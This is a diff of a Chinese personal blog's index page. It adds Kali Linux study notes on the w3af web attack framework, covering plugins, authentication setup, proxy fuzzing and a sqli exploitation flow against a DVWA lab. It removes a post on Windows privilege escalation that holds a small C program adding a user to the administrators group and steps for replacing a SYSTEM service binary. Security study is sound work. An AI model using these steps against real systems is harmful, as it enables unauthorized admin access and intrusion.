@@ -240,6 +240,371 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81)%EF%BC%9AW3AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81)%EF%BC%9AW3AF/" itemprop="url">Kali Linux笔记(四十)：W3AF</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:16+08:00">
+                2019-12-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.3k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-w3af"><a href="#1-w3af" class="headerlink" title="1. w3af"></a>1. w3af</h4><blockquote>
+<pre><code>▲ 2019.12.26 Kali未带此软件，通过github下载安装过于复杂，还未成功</code></pre></blockquote>
+<ul>
+<li>Web Application Attack and Audit Framework，基于python语言开发</li>
+<li>此框架的目标是帮助你发现和利用所有WEB应用程序漏洞（和msf框架结合）</li>
+<li>9大类近150个plugin<ul>
+<li><strong>audit</strong>（审计，扫描发现漏洞）</li>
+<li>infrastructure（基础架构，扫描操作系统，Web Server，是否使用waf）</li>
+<li>grep（被动扫描插件类型，根据audit扫描发回的信息进行信息搜索）</li>
+<li>evasion（逃避目标IDS，IBS，WAF的检测）</li>
+<li>mangle（做一些基于正则表达式的计算）</li>
+<li>auth（身份认证）</li>
+<li>bruteforce（暴力破解，fuzz隐藏路径或文件名）</li>
+<li>output（扫描结果output为一种可被其他工具调用的文件）</li>
+<li><strong>crawl</strong>（爬网，通过超链接）</li>
+<li>attack（唯一不可以进行人工修改，已经固定）</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-w3af"><a href="#2-w3af" class="headerlink" title="2. w3af"></a>2. w3af</h4><ul>
+<li>安装（Kali自带版本执行扫描时挂死）<ul>
+<li>cd ~</li>
+<li>apt-get update</li>
+<li>apt-get install -y python-pip w3af</li>
+<li>pip install –upgrade pip</li>
+<li>git clone <a href="https://github.com/andresriancho/w3af.git" target="_blank" rel="noopener">https://github.com/andresriancho/w3af.git</a></li>
+<li>cd w3af</li>
+<li>./w3af_console（./w3af_gui）</li>
+<li>apt-get build-dep python-lxml</li>
+<li>./tmp/w3af_dependency_install.sh</li>
+</ul>
+</li>
+<li>升级<ul>
+<li>git pull</li>
+</ul>
+</li>
+<li>创建快捷方式<ul>
+<li>cp /usr/share/application/w3af.desktop /root/Desktop</li>
+<li>gedit w3af.desktop（修改Exec路径）</li>
+<li>chmod +x w3af</li>
+</ul>
+</li>
+<li>用户接口<ul>
+<li>Console</li>
+<li>Gui</li>
+<li>API</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-w3af-console"><a href="#3-w3af-console" class="headerlink" title="3. w3af_console"></a>3. w3af_console</h4><ul>
+<li>help（显示可用指令）</li>
+<li>plugin（进入plugin子命令）<ul>
+<li>Help（显示可用指令）</li>
+<li>list audit（列出audit类所有的插件）</li>
+<li>audit sqli xss（选择使用的audit类所有的插件）</li>
+<li>grep all</li>
+<li>crawl web_spider</li>
+<li>back</li>
+</ul>
+</li>
+<li>profile（对扫描目标的集成选项）<ul>
+<li>list</li>
+<li>save as self-contained（保存当前配置）</li>
+<li>save as test self-contained</li>
+<li>use（调用）</li>
+</ul>
+</li>
+<li>http-settings（全局性）<ul>
+<li>help</li>
+<li>view（可查看http-settings的设置）</li>
+<li>set（设置）</li>
+<li>save（保存）</li>
+</ul>
+</li>
+<li>misc-settings（全局性）</li>
+<li>target<ul>
+<li>help</li>
+<li>view</li>
+<li>set taget</li>
+</ul>
+</li>
+<li>start</li>
+<li>script<ul>
+<li>script/* .w3af</li>
+</ul>
+</li>
+<li>./w3af_console -s script/sqli.w3af</li>
+</ul>
+<h4 id="4-w3af–身份认证"><a href="#4-w3af–身份认证" class="headerlink" title="4. w3af–身份认证"></a>4. w3af–身份认证</h4><ul>
+<li>HTTP Basic</li>
+<li>NTLM</li>
+<li>Form</li>
+<li>Cookie（双因素身份认证/anti-CSRF tokens U盘令牌格式）</li>
+</ul>
+<blockquote>
+<pre><code>▲ 安装IIS：运行 → appwiz.cpl → 添加/删除组件 → 应用程序服务器 → IIS
+▲ 设置IIS：开始 → 管理工具 → Internet信息服务（IIS）管理器 → 网站 → 默认网站 → 右键 → 属性 → 目录安全性 → 身份验证和访问控制 → 去掉匿名身份认证</code></pre></blockquote>
+<h4 id="5-w3af–基本身份认证"><a href="#5-w3af–基本身份认证" class="headerlink" title="5. w3af–基本身份认证"></a>5. w3af–基本身份认证</h4><ul>
+<li>设置HTTP Basic，设置账号密码</li>
+<li>配置Configuration</li>
+<li>设置Plugin</li>
+<li>可通过抓包，follow TCP流，解码Base64得出用户名密码</li>
+</ul>
+<h4 id="6-w3af–NTLM身份认证"><a href="#6-w3af–NTLM身份认证" class="headerlink" title="6. w3af–NTLM身份认证"></a>6. w3af–NTLM身份认证</h4><ul>
+<li>集成Windows身份认证</li>
+<li>配置Configuration</li>
+<li>设置Plugin</li>
+<li>抓包可看到加密的NTLM信息</li>
+</ul>
+<h4 id="7-w3af–Form身份认证"><a href="#7-w3af–Form身份认证" class="headerlink" title="7. w3af–Form身份认证"></a>7. w3af–Form身份认证</h4><ul>
+<li>不能配置Configuration</li>
+<li>设置Plugin → Auth（detalied/generic）<ul>
+<li>check-string（登陆成功的字符串）</li>
+<li>data_format（数据源代码，格式）</li>
+</ul>
+</li>
+<li>设置Plugin → crawl → Web_spider → only_forward（限定扫描子目录）</li>
+<li>设置Plugin</li>
+</ul>
+<h4 id="8-w3af–Cookie身份认证（绕过令牌ID认证的方式）"><a href="#8-w3af–Cookie身份认证（绕过令牌ID认证的方式）" class="headerlink" title="8. w3af–Cookie身份认证（绕过令牌ID认证的方式）"></a>8. w3af–Cookie身份认证（绕过令牌ID认证的方式）</h4><ul>
+<li>找到网站的Cookie</li>
+<li>w3af只接受严格Cookie格式的文件</li>
+<li>配置Configuration（严格Cookie格式，需要添加时间，最后加00，用TAB键跳转）</li>
+<li>设置Plugin</li>
+</ul>
+<blockquote>
+<pre><code>Cookie文件
+.netscape.com    TRUE    /   FALSE   946684799   NETSCAPE_ID 100103
+Each line represents a single piece of stored information.A tab is inserted between each of the fields
+
+From left-to-right,here is what each field represents:
+domain--The domain that created AND that can read the variable.
+flag--A TRUE/FALSE value indicating if all machines within a given domain can access the variable.This value is set automatically by the browser,depending on the value you set for domain
+Path--The path within the domain that the variable is valid for.
+Secure--A TRUE/FALSE value indicating if a secure connection with the domain is needed to access the variable
+Expiration--The UNIX time that variable will expire on.UNIX time is  as the number of seconds since Jan 1,1970 00:00:00 GMT
+Name--The name of the variable
+Value--The values of the variable</code></pre></blockquote>
+<h4 id="9-w3af–身份认证（截断代理）"><a href="#9-w3af–身份认证（截断代理）" class="headerlink" title="9. w3af–身份认证（截断代理）"></a>9. w3af–身份认证（截断代理）</h4><ul>
+<li>截断代理（▲ 手动Web漏洞挖掘最基础步骤，提交数据代码）</li>
+<li>HTTP header file（另类的身份认证方法）</li>
+<li>保存头文件中不变的变量为一个txt文件，用于Configuration</li>
+<li>Configuration → General → headers_file</li>
+<li>Proxies the HTTP requests,allowing their modification → History → Send Request to Manual Editor（自编辑）</li>
+<li>Proxies the HTTP requests,allowing their modification →History → Fuzzy Request（正则表达式表达）<ul>
+<li>$10$（数字）</li>
+<li>$string.lowercas[:26]$（字母）</li>
+<li>$[‘spam’,’eggss’]$（查找特定字符串）</li>
+<li>$[l.strip() for l in file (‘input.txt’).readline()]$</li>
+</ul>
+</li>
+<li>Proxies the HTTP requests,allowing their modification →History → Compare（比较请求的结果）</li>
+<li>Proxies the HTTP requests,allowing their modification →History → Export Request（导出）</li>
+<li>Proxies the HTTP requests,allowing their modification →History → History → Audit Request with…（调整修改请求内容）</li>
+<li>Cluster responses（ID视图查看）</li>
+</ul>
+<blockquote>
+<pre><code>大部分不变的头部请求：
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip,deflate
+Connection: keep-alive
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User Agent: MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12(GUI) MMP/2.0 UP.Link/6.3.1.13.0
+Host: 192.168.20.7
+Referer: http://192.168.20.7/dvwa/vulnerabilities/sqli/
+Cookie: Security=low; PHPSESSID=f8c40e5267bfbb04a6053e9ec8e6293
+Content-type: application/x-www-form-urlencoded
+
+▲ skipfish的fuzz.txt:/usr/share/wfuzz/wordlist/fuzzdb/Discovery/FilenameBruteforce/wordlistSkipfish.fuzz.txt</code></pre></blockquote>
+<h4 id="10-w3af–截断代理技术"><a href="#10-w3af–截断代理技术" class="headerlink" title="10. w3af–截断代理技术"></a>10. w3af–截断代理技术</h4><ul>
+<li>w3af不支持客户端技术（Javascript，Flash，Java applet等）</li>
+<li>截断代理手动爬网（Proxy）<ul>
+<li>crawl → spider_man（Plugin）</li>
+<li>output → export_requests（Output插件）（~/output.b64 64编码）</li>
+<li><a href="http://127.7.7.7/spider_man?terminate（终止spider_man）" target="_blank" rel="noopener">http://127.7.7.7/spider_man?terminate（终止spider_man）</a></li>
+</ul>
+</li>
+<li>crawl → import_results（base64）</li>
+</ul>
+<h4 id="11-w3af–exploit"><a href="#11-w3af–exploit" class="headerlink" title="11. w3af–exploit"></a>11. w3af–exploit</h4><ul>
+<li>Proxies the HTTP requests,allowing their modification（抓取有SQL I njection路径）</li>
+<li>Configuration → General → headers_file（指定头文件）</li>
+<li>Target（设置Plugin → sqli）</li>
+<li>Start</li>
+<li>Results → Request/Response navigator（查看是否有SQL 语法报错）</li>
+<li>Exploit → Linux命令<ul>
+<li>payload（用法：payload users）</li>
+<li>users</li>
+<li>dbs</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%94)%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2927,217 +3292,6 @@ Ubuntu下：id查看当前用户信息
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/Kali%20Linnx%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/22/Kali%20Linnx%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(三十二)：配置不当提权</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-22T20:58:11+08:00">
-                2019-12-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  274 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-利用配置不当提权"><a href="#1-利用配置不当提权" class="headerlink" title="1. 利用配置不当提权"></a>1. 利用配置不当提权</h4><ul>
-<li>与漏洞提权相比更常用的方法<ul>
-<li>企业环境</li>
-<li>补丁更新的全部已经安装（有一定的安装策略）</li>
-<li>输入变量过滤之外更值得研发关注的安全隐患</li>
-<li>以system权限启动（查看system权限执行的服务）</li>
-<li>NTFS权限允许users修改删除</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-利用配置不当提权"><a href="#2-利用配置不当提权" class="headerlink" title="2. 利用配置不当提权"></a>2. 利用配置不当提权</h4><ul>
-<li>icacls<ul>
-<li>icacls 文件（查看文件NTFS权限）</li>
-<li><strong><code>🔺命令：icacls c:\windows\*.exe /save perm（文件名） /T</code></strong>（所有满足条件的文件）</li>
-<li><strong><code>🔺命令：i686-w64-mingw32-gcc -o admin.exe admin.c</code></strong></li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int i;</span><br><span class="line">  i=system(&quot;net localgroup administrators a add/&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<pre><code>BU：基本用户（若存在权限为FA，即为所要找的文件）
-PU：普通用户
-BA：管理员账户</code></pre></blockquote>
-<ul>
-<li>Window2 2003<ul>
-<li><strong><code>🔺命令：net user a /add</code></strong></li>
-<li><strong><code>🔺命令：net user a</code></strong></li>
-<li>CamView添加user完全控制文件</li>
-<li>拷贝到admin.exe到软件运行目录下，修改名称为原来执行文件的名称</li>
-<li>删除原来执行文件或者改名</li>
-</ul>
-</li>
-<li>Find<ul>
-<li><strong><code>🔺命令：find / -perm 777 -exec ls -l {}（前面所搜到的结果） \;</code></strong></li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3192,7 +3346,7 @@ BA：管理员账户</code></pre></blockquote>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">166</span>
+                  <span class="site-state-item-count">167</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3299,7 +3453,7 @@ BA：管理员账户</code></pre></blockquote>
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">150.5k</span>
+    <span title="Site words total count">150.6k</span>
   
 </div>
 
